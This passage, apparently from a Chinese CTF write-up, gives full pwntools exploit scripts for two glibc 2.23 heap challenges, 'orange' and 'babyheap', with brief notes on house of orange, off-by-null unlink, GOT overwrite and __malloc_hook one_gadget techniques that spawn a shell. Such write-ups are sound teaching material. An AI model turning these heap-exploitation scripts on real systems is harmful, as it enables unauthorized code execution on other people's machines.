class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h1><p>glibc2.23</p><p>能申请任意大小的chunk和堆溢出，但是没有free</p><p>利用 house of orange 获得空闲块，看题目有后门，还没开full relro，我选择打malloc的GOT表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Please enter your choice>>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input note index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>door<span class="token operator">=</span><span class="token number">0x0000000000400987</span><span class="token comment">#---------orange</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xf40</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment">#ub->0xfe1</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf48</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x60209d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>eg<span class="token punctuation">(</span><span class="token string">'malloc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>door<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#---------attack</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./Orange'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>glibc2.23</p><p><img src="/EXP_FILE/d9abf66b5138d0173b97be4dd8b7c323_MD5.jpeg"></p><p>libc2.23的off by null，打unlink构造重叠堆块，然后打__malloc_hook</p><p>环境条件不满足one_gadget的条件，需要利用__realloc_hook来调节栈帧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Choose an option >> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Give me a index.Let you see see'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#3  </span>add<span class="token punctuation">(</span><span class="token number">0x3f0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#4</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>  <span class="token comment">#5</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'bbbb'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">,</span>leak<span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>__free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>__malloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">)</span>__realloc_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>target<span class="token operator">=</span>__malloc_hook<span class="token operator">-</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token number">5</span>lg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span>target<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token string">b'x'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xf03a4</span><span class="token punctuation">,</span><span class="token number">0xf1247</span><span class="token punctuation">]</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'realloc'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">11</span><span class="token operator">+</span>payload<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0x4527a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv0xf03a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv0xf1247 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv'''</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./babyheap'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token 